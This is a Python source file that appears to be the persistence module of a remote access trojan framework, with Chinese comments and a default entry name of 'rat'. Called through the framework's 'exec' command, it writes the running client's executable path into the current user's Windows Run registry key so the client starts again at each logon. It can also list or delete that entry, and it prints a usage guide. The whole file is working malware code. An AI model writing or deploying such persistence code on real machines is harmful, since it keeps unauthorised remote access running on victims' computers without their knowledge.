# exec win/persist/registry.py --action create
# exec win/persist/registry.py --action delete
# exec win/persist/registry.py --action list --name MyApp
# exec win/persist/registry.py --action list

import winreg

from core.utils.client_util import get_executable_path

# 默认配置
DEFAULT_NAME = 'rat'
EXECUTABLE_PATH = get_executable_path()
KEY_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'


def registry(action='list', name=None):
    """注册表启动项管理

    Args:
        action: create - 创建, delete - 删除, list - 查看
        name: 注册表项名称，默认 rat
        executable: 可执行文件路径，默认当前程序路径
    """
    # 设置默认值
    if name is None:
        name = DEFAULT_NAME

    if action == 'list':
        # 检查指定项是否存在
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY_PATH, 0, winreg.KEY_READ)
            try:
                value, _ = winreg.QueryValueEx(key, name)
                print(f'✓ Registry key "{name}" exists')
                print(f'  Path: {value}')
            except FileNotFoundError:
                print(f'✗ Registry key "{name}" does not exist')
            finally:
                winreg.CloseKey(key)
        except Exception as e:
            print(f'Error: {e}')
        return

    # 打开注册表键
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY_PATH, 0, winreg.KEY_WRITE)

    try:
        if action == 'delete':
            try:
                winreg.DeleteValue(key, name)
                print(f'✓ Registry key "{name}" removed')
            except FileNotFoundError:
                print(f'✗ Registry key "{name}" not found')
        elif action == 'create':
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, EXECUTABLE_PATH)
            print(f'✓ Registry key "{name}" created')
            print(f'  Path: {EXECUTABLE_PATH}')
        else:
            print(f'Unknown action: {action}')
            print_usage()
    finally:
        winreg.CloseKey(key)


def print_usage():
    """打印使用说明"""
    print('\n' + '=' * 50)
    print('Registry Persistence Script')
    print('=' * 50)
    print('\nUsage:')
    print('  --action create               Create registry key (default name: rat)')
    print('  --action delete               Delete registry key (default name: rat)')
    print('  --action list                 Check if registry key exists (default name: rat)')
    print('  --action list --name MyApp    Check specific registry key')
    print('  --action create --name MyApp  Create with custom name')
    print('  --action delete --name MyApp  Delete with custom name')
    print('\nExamples:')
    print('  exec win/persist/registry.py --action create')
    print('  exec win/persist/registry.py --action list --name MyApp')
    print('  exec win/persist/registry.py --action delete --name MyApp')
    print('=' * 50)


# 从 kwargs 获取参数
action = kwargs.get('action', 'list')
name = kwargs.get('name', None)

if action == 'help':
    print_usage()
else:
    registry(action=action, name=name)
